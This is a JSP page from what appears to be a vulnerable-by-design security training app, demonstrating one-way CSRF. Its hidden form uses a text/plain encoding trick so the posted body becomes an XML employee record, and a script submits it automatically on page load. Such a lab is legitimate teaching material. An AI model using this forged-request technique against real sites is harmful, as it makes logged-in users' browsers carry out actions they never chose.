<%@ include file="/commonPage.jsp"%>
<html>
<head>
<title>Test One Way CSRF</title>
</head>
<body>
	<h4>Chapter: One Way CSRF</h4>

	<form enctype="text/plain"
		action="${pageContext.request.contextPath}/result/One-Way-CSRF.jsp?vulnerable=${param.vulnerable}"
		method="post">
		 <input type="hidden" name='<?xml version' value='"1.0"?><employees><employee id="111"><firstName>Lokesh</firstName><lastName>Gupta</lastName><location>India</location></employee><employee id="333"><firstName>David</firstName><lastName>Feezor</lastName><location>USA</location></employee></employees>'>
	</form>
	<script type="text/javascript">
		document.forms[0].submit()
	</script>

	<%@ include file="/instructions/One-Way-CSRF.jsp"%>
</body>
</html>
